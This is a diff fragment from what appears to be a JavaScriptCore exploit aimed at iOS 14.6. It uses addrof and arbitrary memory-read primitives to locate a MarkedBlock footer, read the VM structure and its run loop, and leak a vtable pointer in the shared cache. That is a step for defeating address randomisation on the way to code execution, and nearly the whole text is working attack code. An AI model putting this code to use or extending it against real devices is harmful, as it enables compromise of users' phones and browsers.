@@ -746,15 +746,17 @@ Proto:0x10a0253e8, Leaf]), StructureID: 11704"*/
 	//lets give ios 14.6 a try at this same method shall we
 	var objaddr = stage2.addrof(a);
 	print("objaddr" + hex1(objaddr))
-	var footeraddr = "0x" + ((objaddr & 0xfffc0000) + (((objaddr/0x100000000)|0)*0x100000000)+0x4000-0x130).toString(16);
+	var footeraddr = ((objaddr & 0xfffc0000) + (((objaddr/0x100000000)|0)*0x100000000)+0x4000-0x130);
+	//refer to VM.h this is
+        //JSC::MarkedBlock::footer at offset 8 should be the vm struct
 	print("footeraddr @ " + footeraddr);
-	var vmstruct = memory.read(footeraddr,0x40);
-	print("vmstruct @ " + prim_hexdump(vmstruct));
-	/*var m_runloop = memory.readInt64(Add(vmstruct,0x10));
-	print("m_runloop @ " + m_runloop);
-	var vtable = memory.readInt64(m_runloop);
-	print("vtable @ " + vtable);*/
-	
+	var vmstruct = memory.read64(footeraddr+0x8);
+	print("vmstruct @ " + hex1(vmstruct));
+	var m_runloop = memory.read64(vmstruct+0x10);
+	print("m_runloop @ " + hex1(m_runloop));
+	//at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
+        var vtable = stage2.read64(m_runloop);
+        print("vtable @ " + hex1(vtable));
 
 
 	
